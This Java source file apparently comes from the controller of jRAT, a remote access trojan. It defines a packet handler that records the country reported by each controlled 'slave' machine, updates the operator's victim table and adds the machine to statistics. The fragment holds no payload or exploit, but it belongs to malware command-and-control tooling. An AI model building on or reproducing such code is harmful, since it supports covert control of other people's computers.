package io.jrat.client.packets.incoming;

import io.jrat.client.Slave;
import io.jrat.client.settings.Settings;
import io.jrat.client.settings.Statistics;
import io.jrat.client.ui.frames.Frame;
import io.jrat.client.utils.Utils;

import java.io.DataInputStream;


public class Packet47InitCountry extends AbstractIncomingPacket {

	@Override
	public void read(Slave slave, DataInputStream dis) throws Exception {
		String country = slave.readLine().toLowerCase();

		if (!Settings.getGlobal().getBoolean("geoip")) {
			slave.setCountry(country);

			int row = Utils.getRow(slave);

			if (row != -1) {
				Frame.mainModel.setValueAt(slave.getCountry().toUpperCase().trim(), row, 0);
				Frame.mainTable.repaint();
			}
		}

		Statistics.getGlobal().add(slave);
	}

}
